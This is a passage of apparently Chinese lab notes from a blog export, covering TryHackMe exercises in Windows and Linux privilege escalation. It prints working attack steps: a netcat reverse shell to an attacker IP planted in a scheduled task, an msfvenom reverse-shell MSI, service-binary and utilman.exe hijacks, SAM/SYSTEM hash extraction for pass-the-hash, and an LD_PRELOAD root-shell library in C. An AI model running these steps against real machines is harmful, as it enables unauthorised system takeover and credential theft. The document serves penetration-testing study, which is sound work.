允许我们使用其他用户的凭据。此功能还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">cmdkey /list<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062026480.png" alt="image-20240806202601368"></p><p>我们看不到实际的密码，但我们可以结合<code>runas</code>和<code>/savecred</code>  一起使用</p><p><code>runas /savecred /user:mike.katz cmd.exe</code></p><p>以mike.katz的身份运行cmd，并使用/savecred对凭据进行一个保存。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062029502.png" alt="image-20240806202913360"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408062031594.png" alt="image-20240806203141284"></p><h3 id="IIS-配置"><a href="#IIS-配置" class="headerlink" title="IIS 配置"></a>IIS 配置</h3><p>IIS(Internet 信息服务)是windows中默认安装的web服务器，IIS的网站配置文件存储在名为web.config的文件中，里面可以存放着数据库密码或者身份验证的一些信息。</p><p>下面是常见的web.config的安装位置：</p><ul><li>C:\inetpub\wwwroot\web.config</li><li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</li></ul><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071510964.png" alt="image-20240807151007853"></p><h3 id="PuTTY"><a href="#PuTTY" class="headerlink" title="PuTTY"></a>PuTTY</h3><p>PuTTY 是 Windows 系统上常见的 SSH 客户端。用户无需每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供日后使用。虽然 PuTTY 不允许用户存储他们的 SSH密码，但它会存储包含明文身份验证凭据的代理配置。</p><p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s<br></code></pre></td></tr></table></figure><p>SimonTatham是一个人名即PuTTY的创作者。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408071804837.png" alt="image-20240807180431561"></p><h2 id="其他方法："><a href="#其他方法：" class="headerlink" title="其他方法："></a>其他方法：</h2><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>使用<code>schtasks</code>列出计划任务，在本例中，使用<code>schtasks /query /tn vulntask /fo list /v</code> 列出vulntask任务的详细信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081649682.png" alt="image-20240808164954610"></p><p>对我们来说重要的是Task To Run 和Run As User这两个参数，一个是计划任务的内容，一个是以什么身份来运行这个计划任务的文件。</p><p>如果当前的用户可以修改或覆盖这个可执行的文件，我们就可以控制该用户执行的内容，从而实现简单的权限提升。</p><p>要检查可执行文件的权限，我们使用<code>icacls</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081657726.png" alt="image-20240808165723675"></p><p>Users对这个文件具有F权限(完全访问权限，这个权限允许用户执行所有可能的操作)</p><p>然后向这个文件中写入一个反弹shell的命令，并运行它。</p><p><code>echo c:\tools\nc64.exe -e cmd.exe 10.14.74.6 4444 &gt; C:\tasks\schtask.bat</code>  </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750021.png" alt="image-20240808175031930"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408081750486.png" alt="image-20240808175045428"></p><h3 id="始终安装高权限"><a href="#始终安装高权限" class="headerlink" title="始终安装高权限"></a>始终安装高权限</h3><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些文件可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成以管理员权限运行的恶意 MSI 文件。</p><p>此方法需要设置两个注册表值，下面是命令：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br><span class="hljs-name">C</span>:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure><p>然后利用msfvenom生成一个恶意的msi文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi<br></code></pre></td></tr></table></figure><p>由于这是一个反向 shell，还应该运行相应配置的Metasploit Handler 模块。传输创建的文件后，可以使用以下命令运行安装程序并接收反向 shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi<br></code></pre></td></tr></table></figure><h2 id="滥用服务错误配置"><a href="#滥用服务错误配置" class="headerlink" title="滥用服务错误配置"></a>滥用服务错误配置</h2><h3 id="Windows-服务"><a href="#Windows-服务" class="headerlink" title="Windows 服务"></a>Windows 服务</h3><p>Windows服务由服务控制管理器(SCM)管理,Windows上的每项服务都会有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件会实现特殊功能以便能够与 SCM 通信，因此并非任何可执行文件都可以作为服务成功启动。每项服务还指定了运行服务的用户帐户。</p><p>使用<code>sc qc</code>来查看某项服务的详细信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091759032.png" alt="image-20240809175925827"></p><p><strong>BINARY_PATH_NAME</strong>指向的是关联的可执行文件，<strong>SERVICE_START_NAME</strong>指向的是运行该服务的用户。</p><p>服务具有自主访问控制列表(DACL) 它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他特权。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091807073.png" alt="image-20240809180723847"></p><p>所有服务配置都存储在注册表中，*<em>HKLM\SYSTEM\CurrentControlSet\Services*</em></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091808769.png" alt="image-20240809180845623"></p><h3 id="服务可执行文件的权限不安全"><a href="#服务可执行文件的权限不安全" class="headerlink" title="服务可执行文件的权限不安全"></a>服务可执行文件的权限不安全</h3><p>某项服务的可执行文件的权限相对来说较弱，攻击者可以修改可执行文件的内容。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091834411.png" alt="image-20240809183435236"></p><p>对于上面服务执行的用户是svcusr1，我们去查看一下可执行文件的权限。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091839198.png" alt="image-20240809183934118"></p><p>everyone组具有M权限(可修改权限)</p><p>首先利用msfvenom生成一个反弹shell的exe文件</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091853700.png" alt="image-20240809185310630"></p><p>然后开一个python服务，利用wget把exe文件放到powshell中</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091901121.png" alt="image-20240809190155020"></p><p>然后将权限弱的可执行文件进行一个备份，并将生成的恶意文件替换到可执行文件的位置，然后再赋予一个F权限。</p><p><code>move WService.exe WService.exe.bkp</code></p><p><code>move C:\Users\thm-unpriv\rev-svc.exe WService.exe</code></p><p><code>icacls WService.exe /grant Everyone:F</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091904751.png" alt="image-20240809190407596"></p><p>最后再攻击机上监听端口，并再windows上重启服务。</p><p> <code>sc stop windowsscheduler</code></p><p> <code>sc start windowsscheduler</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408091906501.png" alt="image-20240809190646410"></p><h3 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012042594.png" alt="image-20240901204211485"></p><p>如上图所示，这个服务是没有引号的，并且Disk Sorter Enterprise中间是有空格的，SCM不知道执行哪一项 就会出现下面的情况。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Argument 1</td><td>Argument 2</td></tr><tr><td>C:\MyPrograms\Disk.exe</td><td>Sorter</td><td>Enterprise\bin\disksrs.exe</td></tr><tr><td>C:\MyPrograms\Disk Sorter.exe</td><td>Enterprise\bin\disksrs.exe</td><td></td></tr><tr><td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td><td></td><td></td></tr></tbody></table><p>这与命令提示符解析命令的方式有关。通常，当您发送命令时，空格用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着对未带引号的命令的“正确”解释是执行<code>C:\\MyPrograms\\Disk.exe</code>并将其余部分作为参数。</p><p>SCM 并没有像它应该的那样失败，而是尝试帮助用户并开始按照表中显示的顺序搜索每个二进制文件：</p><ol><li>首先，搜索<code>C:\\MyPrograms\\Disk.exe</code>。如果存在，服务将运行该可执行文件。</li><li>如果后者不存在，它就会搜索<code>C:\\MyPrograms\\Disk Sorter.exe</code>。如果存在，服务就会运行这个可执行文件。</li><li>如果后者不存在，它将搜索<code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code>。此选项预计会成功，并且通常会在默认安装中运行。</li></ol><p>从这个行为可以看出问题所在。如果攻击者创建在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。</p><p>通常情况下，服务可执行文件会默认安装在C:\Program Files 或 C:\Program Files (x86) 下。非特权用户不可写，但有些服务会更改它的默认安装位置，如果这些服务的安装位置是我们可以更改的，那么这个漏洞就容易被利用。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012103259.png" alt="image-20240901210353113"></p><p>该<code>BUILTIN\\Users</code>组具有<strong>AD</strong>和<strong>WD</strong>权限，分别允许用户创建子目录和文件。</p><p>首先我们利用linux生成一个反弹shell的exe文件，上传进去，然后将这个exe文件移动到C:\MyPrograms\Disk.exe中，对这个可执行文件赋予全部权限，最后重启这个服务即可。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012119276.png" alt="image-20240901211917190"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012122578.png" alt="image-20240901212210441"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012127201.png" alt="image-20240901212754030"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012128551.png" alt="image-20240901212805459"></p><h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><p>如果服务的可执行 DACL 配置(服务可执行文件的权限)正确，并且服务的二进制路径引用正确，您仍有一线机会利用该服务。如果服务 DACL（不是服务的可执行DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向您需要的任何可执行文件，并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p><p><strong>服务DACL是对服务本身的控制</strong></p><p>要从命令行检查服务 DACL，可以使用Sysinternals 套件中的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a>。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229436.png" alt="image-20240901222954169"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012229891.png" alt="image-20240901222938643"></p><p>我们可以看到该<code>BUILTIN\\Users</code>组具有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置该服务。</p><p>然后我们生成一个反弹shell的exe文件，上传上去，修改其权限，然后更改服务关联的可执行文件和帐户，最后重启服务，等待反弹shell。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012235967.png" alt="image-20240901223501856"></p><p><code>sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012236789.png" alt="image-20240901223633706"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409012244754.png" alt="image-20240901224455692"></p><h2 id="滥用危险特权"><a href="#滥用危险特权" class="headerlink" title="滥用危险特权"></a>滥用危险特权</h2><h3 id="Windows-权限"><a href="#Windows-权限" class="headerlink" title="Windows 权限"></a>Windows 权限</h3><p>特权是帐户执行特定系统相关任务的权利。这些任务可以简单到关闭机器的特权，也可以是绕过某些基于DACL的访问控制的特权。</p><p>每个用户都有一组分配的权限，可以使用以下命令进行检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">whoami /priv<br></code></pre></td></tr></table></figure><p><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants</a> 提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才是值得关注的。</p><p>我们可以在 <a href="https://github.com/gtworek/Priv2Admin/blob/master/README.md">https://github.com/gtworek/Priv2Admin/blob/master/README.md</a>  上找到可利用权限的完整列表。</p><h3 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup/SeRestore"></a>SeBackup/SeRestore</h3><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，而忽略任何现有的DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p><p>有了这种能力，攻击者就可以使用多种技术轻松提升系统权限。我们将要研究的技术包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希。</p><p>我们以管理员身份打开powshell才能使用上面的权限，以管理员身份打开后需要再次输入此账户的密码。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031546279.png" alt="image-20240903154626152"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031547977.png" alt="image-20240903154758909"></p><p>整体的攻击思路:</p><p>首先我们先备份sam和system的哈希，然后我们可以使用SMB服务或者其他的，将这两个备份的hash文件传递到攻击机上面，然后检索用户的哈希值，我们可以得到administrator的哈希值</p><p>最终可以使用管理员的哈希执行传递哈希攻击，并以 SYSTEM 权限访问目标机器.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031611062.png" alt="image-20240903161147004"></p><p>此时已经备份成功。</p><p>然后启动smb服务，在本地创建一个share目录作为共享的public目录。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031620802.png" alt="image-20240903162004730"></p><p>将两个备份文件传递到public目录上去。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031628623.png" alt="image-20240903162833498"></p><p>然后检索hash.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031632347.png" alt="image-20240903163251253"></p><p>可以看到能够得到administrator的hash.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031635718.png" alt="image-20240903163517545"></p><p>最后也是成功的得到了administrator权限。</p><h3 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h3><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了许多可能性，例如，我们可以搜索以 SYSTEM 身份运行的服务并获取该服务可执行文件的所有权。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031654370.png" alt="image-20240903165417290"></p><p>这次我们将利用<code>utilman.exe</code>来提升权限。Utilman 是一款内置 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031707081.png" alt="image-20240903170729988"></p><p>由于 Utilman 以 SYSTEM 权限运行，因此如果我们将原始二进制文件替换为我们喜欢的任何有效载荷，我们将有效地获得 SYSTEM 权限。由于我们可以获得任何文件的所有权，因此替换它很简单。</p><p>下面是整体攻击思路：</p><p>首先我们获取utilman.exe的所有权，然后我们对当前所在用户赋予对utilman.exe的完全控制的权限，接着用 cmd.exe 的副本替换 utilman.exe，最后再触发utilman.exe即可。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031718432.png" alt="image-20240903171856361"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031719957.png" alt="image-20240903171924694"></p><h3 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate/SeAssignPrimaryToken"></a>SeImpersonate/SeAssignPrimaryToken</h3><p>这些权限允许进程模拟其他用户并代表他们行事。模拟通常包括能够在另一个用户的安全上下文中生成进程或线程。</p><p>没看懂什么意思…</p><h2 id="滥用易受攻击的软件"><a href="#滥用易受攻击的软件" class="headerlink" title="滥用易受攻击的软件"></a>滥用易受攻击的软件</h2><h3 id="未打补丁的软件"><a href="#未打补丁的软件" class="headerlink" title="未打补丁的软件"></a>未打补丁的软件</h3><p>目标系统上安装的软件可以提供各种特权提升机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用该 <code>wmic</code> 工具列出目标系统上安装的软件及其版本。以下命令将转储它可以收集的有关已安装软件的信息.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell-session">wmic product get name,version,vendor<br></code></pre></td></tr></table></figure><p>有的时候，这并不能给出所有的信息，我们还需要注意桌面快捷方式，可用服务或通常任何表明可能存在其他易受攻击的软件的痕迹。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031839409.png" alt="image-20240903183956263"></p><p>下面是一些工具：</p><p>WinPEAS <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031849604.png" alt="image-20240903184931481"></p><p>PrivescCheck <a href="https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850008.png" alt="image-20240903185011924"></p><p>WES-NG <a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202409031850965.png" alt="image-20240903185038892"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识linux提权</title>
    <link href="/2024/07/30/linux%E6%8F%90%E6%9D%83/"/>
    <url>/2024/07/30/linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><p>简单来讲，提权就是将一个低权限用户利用系统的漏洞，设计缺陷等提升到一个高权限用户的过程。</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>就是进一步的进行信息收集。</p><h3 id="hostname"><a href="#hostname" class="headerlink" title="hostname"></a>hostname</h3><p>返回目标机器的主机名，在某些情况下，可以提供有关目标系统在公司网络中的角色的信息。</p><h3 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a>uname -a</h3><p>打印系统信息，为我们提供有关系统使用的内核的更多详细信息。</p><h3 id="proc-version"><a href="#proc-version" class="headerlink" title="/proc/version"></a>/proc/version</h3><p>提供有关目标系统进程的信息，查看<code>/proc/version</code>可能会为您提供有关内核版本的信息和其他数据，例如是否安装了编译器（例如 GCC）。</p><h3 id="etc-issue"><a href="#etc-issue" class="headerlink" title="/etc/issue"></a>/etc/issue</h3><p>通过查看<code>/etc/issue</code>文件来识别系统。</p><h3 id="ps-Command"><a href="#ps-Command" class="headerlink" title="ps Command"></a>ps Command</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407311955973.png" alt="image-20240731195547857"></p><p>PID是进程号 TTY是用户使用的终端类型 TIME是进程使用的CPU时间 CMD是正在运行的命令或可执行文件</p><p><code>ps -A</code> 查看所有正在运行的进程</p><p><code>ps axjf</code>：查看进程树</p><p><code>ps aux</code>: <code>aux</code> 选项将显示所有用户的进程（a）、显示启动进程的用户（u）以及显示未附加到终端的进程（x）。</p><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p>查看系统用户。</p><p><code>cat /etc/passwd | cut -d &quot;:&quot; -f 1</code> </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407312016606.png" alt="image-20240731201612405"></p><h3 id="ip-route"><a href="#ip-route" class="headerlink" title="ip route"></a>ip route</h3><p>查看网络路由</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407312019805.png" alt="image-20240731201937765"></p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p><code>netstat -a</code>显示所有监听端口及已建立的连接。</p><p><code>netstat -au 或 netstat -at</code> 可用于分别列出UDP或TCP协议。</p><p><code>netstat -l</code>：列出处于“监听”模式的端口。</p><p><code>netstat -s</code> 按协议列出网络使用情况统计信息。</p><p><code>netstat -tp</code> 列出带有服务名称和PID信息的连接。</p><p><code>netstat -i</code>：显示接口统计信息。</p><p><code>netstat -ano</code> </p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><code>find . -name flag.txt</code> // 查找当前目录下的flag.txt的文件。</p><p><code>find /home -name flag.txt</code> // 查找home目录下的flag.txt文件。</p><p><code>find / -type d -name config</code> // 在/目录下查找名为config的目录</p><p><code>find / -type f -perm 0777</code> //查找具有 777 权限的文件（所有用户可读、可写、可执行的文件）</p><p><code>find / -perm a=x</code> //查找可执行文件。</p><p><code>find /home -user frank</code> //查找home目录下frank用户的所有文件。</p><p><code>find / -mtime 10</code> //查找过去10天内修改的文件</p><p><code>find / -atime 10</code> //查找过去10天内访问的文件</p><p><code>find / -cmin 10</code> //查找过去1h内更改过的文件</p><p><code>find / -amin 10</code> //查找过去1h内访问过的文件</p><p><code>find / -size 50M</code> //查找大小为50MB的文件</p><p>有的时候使用find命令会出现错误，这个时候使用<code>-type f 2&gt;dev/null</code> 将错误重定向到/dev/null中</p><p><code>find / -writable -type d 2&gt;/dev/null</code></p><p><code>find / -perm -222 -type d 2&gt;/dev/null</code></p><p><code>find / -perm -o w -type d 2&gt;/dev/null</code></p><p>查找linux中所有可写的文件夹</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> 查找具有SUID位的文件</p><h2 id="自动枚举工具"><a href="#自动枚举工具" class="headerlink" title="自动枚举工具"></a>自动枚举工具</h2><ul><li><strong>LinPeas</strong>：<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li><strong>LinEnum：</strong><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li><strong>LES（Linux漏洞利用建议器）：</strong><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li><strong>Linux智能枚举：</strong><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li><li><strong>Linux隐私检查器：</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li></ul><p>用于帮助枚举linux的系统信息，帮助发现潜在的权限提升漏洞。</p><h2 id="权限提升：内核漏洞"><a href="#权限提升：内核漏洞" class="headerlink" title="权限提升：内核漏洞"></a>权限提升：内核漏洞</h2><p>Linux系统上的内核 管理系统内存和应用程序等组件之间的通信。此关键功能需要内核具有特定权限；因此，成功利用此漏洞可能会获得 root 权限。</p><h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3><p>1.搜索内核的版本信息。</p><p>2.查找目标版本的漏洞信息，进一步利用。</p><h3 id="提示-amp-说明："><a href="#提示-amp-说明：" class="headerlink" title="提示&amp;说明："></a>提示&amp;说明：</h3><p>在启动漏洞代码之前，请务必了解其工作原理。某些漏洞代码可能会对操作系统进行更改，从而导致其在进一步使用时不安全，或对系统进行不可逆转的更改，从而在以后造成问题。当然，这些在实验室或 CTF 环境中可能不是什么大问题，但在真正的渗透测试过程中，这些绝对是禁忌。</p><h3 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h3><p>ssh登录进去，查看内核版本的信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031326248.png" alt="image-20240803132633195"></p><p>利用searchsploit进行搜索。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031325746.png" alt="image-20240803132549682"></p><p>可以先利用这个试一下。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031335284.png" alt="image-20240803133524204"></p><p>提权成功。</p><h2 id="权限提升：Sudo"><a href="#权限提升：Sudo" class="headerlink" title="权限提升：Sudo"></a>权限提升：Sudo</h2><p>默认情况下，sudo命令允许以root的身份运行程序，在某些情况下，系统管理员需要对普通用户提供权限，例如一个普通用户以root身份运行nmap，但其他的地方都是普通权限。</p><h3 id="1-sudo-l"><a href="#1-sudo-l" class="headerlink" title="1.sudo -l"></a>1.sudo -l</h3><p>可以使用sudo -l来查看哪些地方使用了root权限。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031435102.png" alt="image-20240803143552893"></p><p><a href="https://gtfobins.github.io/%E6%98%AF%E4%B8%80%E4%B8%AA%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%AE%83%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%89%E5%85%B3%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%82%A8%E5%8F%AF%E8%83%BD%E6%8B%A5%E6%9C%89">https://gtfobins.github.io/是一个有价值的资源，它提供了有关如何使用您可能拥有</a> sudo 权限的任何程序的信息。</p><h3 id="2-利用-LD-PRELOAD"><a href="#2-利用-LD-PRELOAD" class="headerlink" title="2.利用 LD_PRELOAD"></a>2.利用 LD_PRELOAD</h3><p>在某些情况下，可能会看到LD_PRELOAD的环境选项。</p><p><img src="https://i.imgur.com/gGstS69.png" alt="img"></p><p>LD_PRELOAD是一个允许任何程序使用共享库的函数。如果启用了“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行。请注意，如果实际用户 ID 与有效用户 ID 不同，则将忽略 LD_PRELOAD 选项。</p><p>步骤如下：<br>1.检查LD_PRELOAD。</p><p>2.编写一个简单的c语言，编译为共享对象文件(.so)。</p><p>3.使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行该程序。</p><p>简单实例如下：</p><p>命名为shell.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>setgid(<span class="hljs-number">0</span>);<br>setuid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code>  // 编译共享代码库 shell.so</p><p><code>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code> </p><p><img src="https://i.imgur.com/1YwARyZ.png" alt="img"></p><h2 id="权限提升：SUID"><a href="#权限提升：SUID" class="headerlink" title="权限提升：SUID"></a>权限提升：SUID</h2><p>当一个可执行文件设置了 SUID 位，并且这个文件的所有者是 root（超级用户），普通用户执行这个文件时，操作系统会临时赋予该用户 root 权限来执行文件中的代码。这样，用户就可以执行一些通常需要 root 权限的操作。</p><p>查找具有suid标志位文件的命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span 